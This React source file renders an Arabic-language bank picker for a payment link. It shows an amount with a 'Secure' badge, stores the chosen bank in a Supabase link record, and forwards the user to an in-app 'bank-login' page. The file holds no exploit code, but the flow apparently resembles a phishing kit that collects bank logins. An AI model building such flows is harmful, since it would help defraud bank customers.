import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import {
  Building2,
  Loader2,
  ShieldCheck,
  Lock,
  ChevronRight,
  Info,
  Globe,
  Search
} from "lucide-react";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import { Input } from "@/components/ui/input";
import BackButton from "@/components/BackButton";
import BottomNav from "@/components/BottomNav";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [searchTerm, setSearchTerm] = useState("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      setTimeout(() => {
        setBanks(getBanksByCountry(countryCode));
        setLoadingBanks(false);
      }, 300);
    }
  }, [countryCode]);

  const filteredBanks = banks.filter(bank =>
    bank.nameAr.includes(searchTerm) || bank.name.toLowerCase().includes(searchTerm.toLowerCase())
  );
  
  const handleBankSelect = async (bankId: string) => {
    if (!linkData) return;
    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...linkData.payload, selectedBank: bankId }
      });
      navigate(`/pay/${id}/bank-login`);
    } catch (error) {
      console.error(error);
    }
  };
  
  if (linkLoading || !linkData) {
    return <div className="min-h-screen flex items-center justify-center bg-[#F8FAFC]"><Loader2 className="w-10 h-10 animate-spin text-blue-600" /></div>;
  }

  const amount = linkData.payload.payment_amount || linkData.payload.cod_amount || 500;
  const currency = linkData.payload.currency_code || countryData?.currency || "SAR";

  return (
    <div className="min-h-screen bg-[#F0F2F5] pb-24 px-2" dir="rtl">
      <header className="bg-white border-b-2 border-blue-600 shadow-sm sticky top-0 z-50 mx-[-8px] mb-6">
        <div className="container mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
             <BackButton />
             <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-white shadow-lg"><Building2 className="w-5 h-5" /></div>
             <div>
                <h1 className="text-sm sm:text-lg font-black text-gray-800">البوابة المصرفية</h1>
                <p className="text-[7px] sm:text-[8px] font-bold text-blue-600 uppercase tracking-widest">Digital Banking</p>
             </div>
          </div>
          <div className="flex items-center gap-2">
             <div className="bg-green-50 text-green-700 px-2 py-1 rounded-full text-[8px] font-black border border-green-100 uppercase sm:flex items-center gap-1 hidden">
                <ShieldCheck className="w-3 h-3" /> Secure
             </div>
             <div className="text-left border-r pr-3 sm:pr-4 sm:mr-2">
                <p className="text-[7px] font-bold text-gray-400 uppercase">Amount</p>
                <p className="text-sm sm:text-base font-black text-blue-600">{formatCurrency(amount, currency)}</p>
             </div>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-2 max-w-4xl">
        <div className="space-y-6">
          <div className="text-center sm:text-right space-y-1">
             <h2 className="text-xl sm:text-2xl font-black text-gray-800">اختر بنكك</h2>
             <p className="text-xs font-bold text-gray-500">يرجى اختيار البنك للمتابعة بشكل آمن</p>
          </div>

          <div className="relative group">
             <Search className="absolute right-3.5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400 group-focus-within:text-blue-600 transition-colors" />
             <Input placeholder="ابحث عن اسم البنك..." className="h-12 sm:h-14 pr-10 text-base border-2 rounded-xl bg-white focus:border-blue-600 transition-all font-bold" value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} />
          </div>

          {loadingBanks ? (
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3">
               {[1,2,3,4,5,6,7,8].map(i => <div key={i} className="h-24 sm:h-32 bg-white rounded-2xl animate-pulse border border-gray-100"></div>)}
            </div>
          ) : (
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3">
              {filteredBanks.map((bank) => (
                <button key={bank.id} onClick={() => handleBankSelect(bank.id)} className="group relative h-28 sm:h-36 bg-white rounded-2xl sm:rounded-[2rem] p-4 flex flex-col items-center justify-center gap-2 sm:gap-3 transition-all hover:shadow-xl border-2 border-white hover:border-blue-100">
                  <div className="w-10 h-10 sm:w-16 sm:h-16 flex items-center justify-center transition-transform group-hover:scale-110">
                    <BankLogo bankId={bank.id} bankName={bank.name} bankNameAr={bank.nameAr} className="max-h-full max-w-full object-contain" />
                  </div>
                  <p className="text-[10px] sm:text-xs font-black text-gray-700 text-center leading-tight">{bank.nameAr}</p>
                  <div className="absolute top-2 left-2 w-5 h-5 rounded-full border border-gray-100 flex items-center justify-center group-hover:bg-blue-600 transition-all">
                     <ChevronRight className="w-2.5 h-2.5 text-transparent group-hover:text-white" />
                  </div>
                </button>
              ))}
            </div>
          )}
        </div>
      </main>
      <BottomNav />
    </div>
  );
};

export default PaymentBankSelector;
